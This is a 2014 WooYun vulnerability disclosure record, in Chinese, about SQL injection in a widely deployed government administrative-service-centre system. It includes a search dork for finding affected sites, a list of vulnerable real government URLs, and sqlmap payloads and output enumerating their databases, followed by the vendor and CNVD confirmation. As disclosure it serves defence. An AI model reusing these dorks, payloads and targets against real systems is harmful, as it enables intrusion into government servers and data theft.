{"id": 55355, "wybug_id": "wooyun-2014-061230", "wybug_title": "某通用型政务中心系统SQL注入影响大量政府站", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "xfkxfk", "wybug_date": "2014-05-19 14:45", "wybug_open_date": "2014-08-17 14:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向公众公开  简要描述： 某通用型政务中心系统SQL注入，影响大量政府网站，可被脱裤 详细说明：  成都西辰软件有限公司http://www.westarsoft.com/其行政服务中心系统大量政府在用，存在sql注入，影响大量政府站，可被脱裤官方案例：http://www.westarsoft.com/list/?bid=31Google关键字：技术支持：成都西辰软件有限公司 行政服务中心搜索结果13W+SQL注入存在：政务大厅>> 表格下载Google关键字：inurl:/zwdt/bgxz.jsphttp://www.cszw.gov.cn/web/zwdt/bgxz_bg.jsp?id=101http://zwzx.lueyang.gov.cn/web/zwdt/bgxz_bg.jsp?id=0002http://61.161.111.133/web/zwdt/bgxz_bg.jsp?id=101http://www.xhxspzx.com/web/zwdt/bgxz_bg.jsp?id=101http://xzfw.xjcbcr.gov.cn/web/zwdt/bgxz_bg.jsp?id=103http://zwzx.chenggu.gov.cn/web/zwdt/bgxz_bg.jsp?id=101http://222.179.44.172/web/zwdt/bgxz_bg.jsp?id=128http://www.hlxzsp.gov.cn/web/zwdt/bgxz_bg.jsp?id=101http://fw.ynqb.gov.cn:8081/web/zwdt/bgxz_bg.jsp?id=161http://218.200.21.34/web/zwdt/bgxz_bg.jsp?id=101......不在意义列举   漏洞证明：  拿重庆市长寿区行政服务中心为例：http://www.cszw.gov.cn/web/zwdt/bgxz_bg.jsp?id=101\n---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=101' AND 6323=6323 AND 'klFW'='klFW    Type: UNION query    Title: Generic UNION query (NULL) - 20 columns    Payload: id=-5891' UNION ALL SELECT NULL,CHAR(113)+CHAR(117)+CHAR(103)+CHAR(122)+CHAR(113)+CHAR(114)+CHAR(118)+CHAR(103)+CHAR(74)+CHAR(75)+CHAR(81)+CHAR(78)+CHAR(122)+CHAR(105)+CHAR(113)+CHAR(113)+CHAR(105)+CHAR(104)+CHAR(99)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-----[01:07:23] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: JSPback-end DBMS: Microsoft SQL Server 2005[01:07:23] [INFO] fetching database names[01:07:23] [INFO] the SQL query used returns 8 entries[01:07:23] [INFO] resumed: \"123\"[01:07:23] [INFO] resumed: \"456\"[01:07:23] [INFO] resumed: \"master\"[01:07:23] [INFO] resumed: \"model\"[01:07:23] [INFO] resumed: \"msdb\"[01:07:23] [INFO] resumed: \"sp_changshou\"[01:07:23] [INFO] resumed: \"sp_temp\"[01:07:23] [INFO] resumed: \"tempdb\"available databases [8]:[*] 123[*] 456[*] master[*] model[*] msdb[*] sp_changshou[*] sp_temp[*] tempdb\n云南省丘北县政务服务中心:http://fw.ynqb.gov.cn:8081/web/zwdt/bgxz_bg.jsp?id=161\n---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=161' AND 9386=9386 AND 'umLj'='umLj    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=161'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=161' WAITFOR DELAY '0:0:5'-----[01:12:52] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: JSPback-end DBMS: Microsoft SQL Server 2008[01:12:52] [INFO] fetching database names[01:12:52] [INFO] fetching number of databases[01:12:52] [INFO] resumed: 8[01:12:52] [INFO] resuming partial value: mas[01:12:52] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[01:12:52] [INFO] retrieved: ter[01:13:10] [INFO] retrieved: model[01:13:37] [INFO] retrieved: msdb[01:14:00] [INFO] retrieved: ReportServer[01:14:59] [INFO] retrieved: ReportServerTempDB[01:16:27] [INFO] retrieved: sp_qiubei_real[01:17:35] [INFO] retrieved: sp_temp[01:18:13] [INFO] retrieved: tempdbavailable databases [8]:[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] sp_qiubei_real[*] sp_temp[*] tempdb\n   修复方案：  过滤   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-05-24 12:42 厂商回复： CNVD确认并复现所述多个实例情况，已经由CNVD通过以往建立的处置渠道发给成都西辰软件技术中心，根据对方反馈，已经着手进行修复，同时已经联系CNVD测试发现的用户案例，做好应急响应工作 。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}